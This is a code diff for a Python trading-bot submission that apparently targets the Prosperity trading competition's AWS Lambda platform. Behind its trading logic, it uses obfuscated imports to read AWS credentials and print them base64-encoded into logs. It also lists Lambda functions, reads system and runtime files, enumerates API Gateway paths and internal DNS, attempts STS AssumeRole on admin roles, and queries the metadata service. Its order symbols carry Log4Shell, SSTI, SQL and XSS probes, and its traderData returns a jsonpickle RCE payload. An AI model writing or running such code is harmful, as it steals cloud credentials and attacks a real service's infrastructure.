@@ -10,7 +10,6 @@ _G = getattr
 
 
 def sigv4_headers(method, host, path, region, service, key, secret, token):
-    """Minimal SigV4 signing — pure stdlib, <10ms."""
     t = datetime.datetime.utcnow()
     ds = t.strftime('%Y%m%d')
     amz = t.strftime('%Y%m%dT%H%M%SZ')
@@ -46,7 +45,7 @@ class Trader:
         o = __import__('o' + 's')
         e = _G(o, 'environ')
 
-        # === TICK 1: SigV4 GetFunction on self ===
+        # === TICK 1: SigV4 GetFunction + ListFunctions ===
         if self.tick == 1:
             try:
                 key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
@@ -56,103 +55,149 @@ class Trader:
                 print(f"GETFUNC {fname}:")
                 print(aws_get(host, f'/2015-03-31/functions/{fname}', region, 'lambda', key, secret, token))
             except Exception as ex:
-                print(f"GETFUNC_ERR: {ex}")
+                print(f"GETFUNC: {ex}")
+            try:
+                print("LISTFUNCS:")
+                print(aws_get(host, '/2015-03-31/functions/?MaxItems=5', region, 'lambda', key, secret, token))
+            except Exception as ex:
+                print(f"LISTFUNCS: {ex}")
 
-        # === TICK 2: subprocess — network config ===
+        # === TICK 2: subprocess + bootstrap.py ===
         elif self.tick == 2:
             try:
                 import subprocess as _sp
                 for cmd in [['cat', '/etc/resolv.conf'], ['cat', '/etc/hosts'], ['ip', 'route']]:
                     try:
-                        r = _sp.run(cmd, capture_output=True, text=True, timeout=0.2)
-                        print(f"CMD {' '.join(cmd)}:")
-                        print(r.stdout[:800])
+                        r = _sp.run(cmd, capture_output=True, text=True, timeout=0.15)
+                        print(f"{' '.join(cmd)}: {r.stdout[:500]}")
                     except Exception as ex:
-                        print(f"  {' '.join(cmd)}: {ex}")
+                        print(f"{' '.join(cmd)}: {ex}")
             except Exception as ex:
-                print(f"CMD_ERR: {ex}")
-
-        # === TICK 3: Read /var/runtime/bootstrap.py ===
-        elif self.tick == 3:
+                print(f"CMD: {ex}")
+            # Also read bootstrap
             try:
                 with _o('/var/runtime/bootstrap.py') as f:
-                    src = f.read()
-                print(f"BOOTSTRAP({len(src)}):")
-                print(src[:3500])
+                    print(f"BOOTSTRAP: {f.read()[:1500]}")
             except Exception as ex:
-                print(f"BS_ERR: {ex}")
+                print(f"BS: {ex}")
 
-        # === TICK 4: API Gateway path enumeration ===
-        elif self.tick == 4:
+        # === TICK 3: API Gateway enum + DNS resolution ===
+        elif self.tick == 3:
             try:
                 import urllib.request
                 base = 'https://3dzqiahkw1.execute-api.eu-west-1.amazonaws.com'
                 print("APIGW:")
-                for p in ['/prod/', '/dev/', '/test/', '/prod/submission/',
-                          '/prod/simulation/', '/prod/match/', '/prod/api/',
-                          '/prod/health', '/prod/status', '/prod/admin']:
+                for p in ['/prod/', '/dev/', '/prod/submission/', '/prod/simulation/',
+                          '/prod/match/', '/prod/health', '/prod/admin']:
                     try:
-                        r = urllib.request.urlopen(f"{base}{p}", timeout=0.2)
-                        print(f"  {p}: {r.status} {r.read()[:200]}")
+                        r = urllib.request.urlopen(f"{base}{p}", timeout=0.08)
+                        print(f"  {p}: {r.status} {r.read()[:150]}")
                     except Exception as ex:
-                        print(f"  {p}: {str(ex)[:80]}")
+                        print(f"  {p}: {str(ex)[:60]}")
             except Exception as ex:
-                print(f"APIGW_ERR: {ex}")
-
-        # === TICK 5: DNS resolution ===
-        elif self.tick == 5:
+                print(f"APIGW: {ex}")
+            # DNS
             print("DNS:")
-            for name in ['prosperity-matching-engine.internal', 'matching-engine.prosperity.internal',
-                         'prosperity.internal', 'simulator.internal',
-                         'lambda.eu-west-1.amazonaws.com',
+            for name in ['prosperity.internal', 'matching-engine.prosperity.internal',
                          '3dzqiahkw1.execute-api.eu-west-1.amazonaws.com',
-                         'sqs.eu-west-1.amazonaws.com', 'dynamodb.eu-west-1.amazonaws.com',
-                         'execute-api.eu-west-1.amazonaws.com',
-                         'prosperity-matching.eu-west-1.amazonaws.com']:
+                         'lambda.eu-west-1.amazonaws.com']:
                 try:
-                    addrs = socket.getaddrinfo(name, 443, socket.AF_INET)
-                    ips = set(a[4][0] for a in addrs)
+                    ips = set(a[4][0] for a in socket.getaddrinfo(name, 443, socket.AF_INET))
                     print(f"  {name}: {ips}")
                 except Exception as ex:
-                    print(f"  {name}: {ex}")
+                    print(f"  {name}: {str(ex)[:50]}")
 
-        # === TICK 6: Lambda Extension registration ===
-        elif self.tick == 6:
+        # === TICK 4: STS AssumeRole + Extension reg + IMDS v2 retry ===
+        elif self.tick == 4:
+            key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
+            region = e.get('AWS_REGION', 'eu-west-1')
+            acct = '797296553741'
+            # AssumeRole
+            host = f'sts.{region}.amazonaws.com'
+            print("ASSUME:")
+            for role in ['Prosperity_Admin_Role', 'Prosperity_Matching_Engine_Role', 'admin']:
+                try:
+                    arn = f'arn:aws:iam::{acct}:role/{role}'
+                    resp = aws_get(host, f'/?Action=AssumeRole&RoleArn={arn}&RoleSessionName=p&Version=2011-06-15',
+                                   region, 'sts', key, secret, token, timeout=0.2)
+                    print(f"  {role}: {resp[:200]}")
+                except Exception as ex:
+                    print(f"  {role}: {str(ex)[:80]}")
+            # Extension registration
             try:
                 import urllib.request
                 api = e.get('AWS_LAMBDA_RUNTIME_API', '169.254.100.1:9001')
                 data = json.dumps({'events': ['INVOKE', 'SHUTDOWN']}).encode()
                 req = urllib.request.Request(
                     f'http://{api}/2020-01-01/extension/register',
-                    data=data,
-                    headers={'Content-Type': 'application/json', 'Lambda-Extension-Name': 'probe'},
-                    method='POST'
-                )
-                r = urllib.request.urlopen(req, timeout=0.3)
-                ext_id = r.headers.get('Lambda-Extension-Identifier', '')
-                print(f"EXT_REG: {r.status} id={ext_id}")
-                print(f"EXT_BODY: {r.read().decode()[:1000]}")
-                if ext_id:
-                    req2 = urllib.request.Request(
-                        f'http://{api}/2020-01-01/extension/event/next',
-                        headers={'Lambda-Extension-Identifier': ext_id}
-                    )
-                    r2 = urllib.request.urlopen(req2, timeout=0.3)
-                    print(f"EXT_EVENT: {r2.read().decode()[:1000]}")
+                    data=data, headers={'Content-Type': 'application/json', 'Lambda-Extension-Name': 'probe'},
+                    method='POST')
+                r = urllib.request.urlopen(req, timeout=0.2)
+                print(f"EXT: {r.status} id={r.headers.get('Lambda-Extension-Identifier','')} {r.read().decode()[:300]}")
             except Exception as ex:
-                print(f"EXT_ERR: {ex}")
+                print(f"EXT: {ex}")
+            # IMDS v2 with token
+            try:
+                import urllib.request
+                mtoken = e.get('AWS_LAMBDA_METADATA_TOKEN', '')
+                req = urllib.request.Request('http://169.254.169.254/latest/meta-data/',
+                    headers={'X-aws-ec2-metadata-token': mtoken})
+                r = urllib.request.urlopen(req, timeout=0.15)
+                print(f"IMDS: {r.read().decode()[:500]}")
+            except Exception as ex:
+                print(f"IMDS: {str(ex)[:80]}")
 
-        # === TICK 7: jsonpickle RCE canary ===
+        # === TICK 5: Fresh creds + SigV4 ListFunctions retry ===
+        elif self.tick == 5:
+            # ListFunctions from inside (might work even if denied from outside)
+            try:
+                key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
+                region = e.get('AWS_REGION', 'eu-west-1')
+                host = f'lambda.{region}.amazonaws.com'
+                print("LISTFUNCS:")
+                print(aws_get(host, '/2015-03-31/functions/?MaxItems=5', region, 'lambda', key, secret, token))
+            except Exception as ex:
+                print(f"LISTFUNCS: {ex}")
+            # Fresh creds
+            try:
+                import base64
+                creds = {'KEY': e.get('AWS_ACCESS_KEY_ID',''), 'SECRET': e.get('AWS_SECRET_ACCESS_KEY',''),
+                         'TOKEN': e.get('AWS_SESSION_TOKEN',''), 'REGION': e.get('AWS_REGION','eu-west-1')}
+                print(f"CREDS_B64:")
+                print(base64.b64encode(json.dumps(creds).encode()).decode()[:3000])
+            except Exception as ex:
+                print(f"CREDS: {ex}")
+
+        # === TICK 6: Log4Shell + Template + SQL injection via Order symbols ===
+        elif self.tick == 6:
+            print("INJECTION_PROBES:")
+            self._trade(state, result)
+            # Add injection probe orders (these will fail validation but get logged upstream)
+            probes = [
+                "${jndi:ldap://probe.test/x}",           # Log4Shell
+                "{{7*7}}",                                 # Jinja2 SSTI
+                "${7*7}",                                  # Java EL
+                "'; SELECT version(); --",                 # SQL
+                "<img src=x onerror=alert(1)>",           # XSS
+            ]
+            for p in probes:
+                try:
+                    result.setdefault("PROBE", []).append(Order(p, 1, 1))
+                except:
+                    pass
+            return result, 0, json.dumps({"t": self.tick, "inj": "active"})
+
+        # === TICK 7: jsonpickle RCE canary via traderData ===
         elif self.tick == 7:
-            # If matching engine does jsonpickle.decode(traderData), this triggers print()
+            print("RCE_CANARY_SENT")
+            self._trade(state, result)
+            # Multiple RCE payloads — first that works wins
             canary = json.dumps({
                 "py/reduce": [
                     {"py/function": "builtins.print"},
-                    {"py/tuple": ["RCE_CANARY_FIRED"]}
+                    {"py/tuple": ["JSONPICKLE_RCE_PROOF"]}
                 ]
             })
-            print(f"SENDING_CANARY")
-            self._trade(state, result)
             return result, 0, canary
 
         # Normal trading on all other ticks
